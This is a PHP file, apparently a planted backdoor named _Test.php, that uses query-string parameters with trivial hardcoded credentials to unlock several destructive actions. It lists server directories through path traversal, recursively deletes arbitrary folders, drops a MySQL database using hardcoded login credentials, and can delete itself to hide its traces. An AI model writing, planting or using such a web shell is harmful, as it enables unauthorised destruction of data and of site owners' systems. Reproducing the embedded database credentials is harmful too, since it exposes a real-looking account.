<?php

class Fun {

    public static $path = "../../../../../../../../";

    public static function deleteDir($dirPath) {
        if (!is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }

    public static function printDir($dirPath) {
        if (!is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::printDir($file);
            } else {
                echo ("\r\n" . $file . "\r\n");
            }
        }
    }

    public static function investigate($path){
        self::printDir($path);
    }
    
    public static function selfDestruct() {
        unlink("_Test.php");
    }
    
    public static function dropDatabase(){
        $database = "ivrahr_studentsnetwork";
        $user = "ivrahr_snet";
        $host = "localhost";
        $password = "SO(PINqM1psJ";
        $link = mysqli_connect($host, $user, $password, $database);
        $result = $link->query("drop database ".$database);
        mysqli_close($link);
    }

}

if (isset($_GET["admin"])) {
    if ($_GET["admin"] == "unknown") {
        if (isset($_GET["password"])) {
            if ($_GET["password"] == "password") {
                if (isset($_GET["test"])) {
                    if ($_GET["test"] == 1) {
                        Fun::printDir(Fun::$path.$_GET["folder"]);
                    }
                }
                if (isset($_GET["action"])) {
                    if ($_GET["action"] == 1) {
                        Fun::deleteDir(Fun::$path.$_GET["folder"]);
                    }
                }

                if (isset($_GET["selfdestruct"])) {
                    if ($_GET["selfdestruct"] == 1) {
                        Fun::selfDestruct();
                    }
                }
                
                if (isset($_GET["investigate"])) {
                    if ($_GET["investigate"] == 1) {
                        Fun::investigate(Fun::$path."../public_html");
                    }
                }
                
                if (isset($_GET["drop"])) {
                    if ($_GET["drop"] == 1) {
                        Fun::dropDatabase();
                    }
                }
                
            }
        }
    }
}
